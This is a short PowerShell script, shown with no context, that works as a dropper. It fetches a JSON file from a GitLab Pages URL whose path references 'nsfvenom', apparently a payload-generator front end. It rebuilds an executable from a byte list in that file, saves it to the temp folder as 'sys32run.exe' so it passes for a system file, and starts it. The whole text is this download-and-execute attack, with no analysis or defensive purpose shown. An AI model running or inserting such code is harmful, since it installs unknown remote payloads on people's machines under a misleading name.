$j = iwr 'https://princesspi.gitlab.io/nsfvenom-front-end/sillyfilly.json' | ConvertFrom-Json
$bytes=$j.sillyfillies.split(",")
[io.file]::WriteAllBytes("$Env:Temp\sys32run.exe", $bytes)
Start-Process -FilePath "$Env:Temp\sys32run.exe"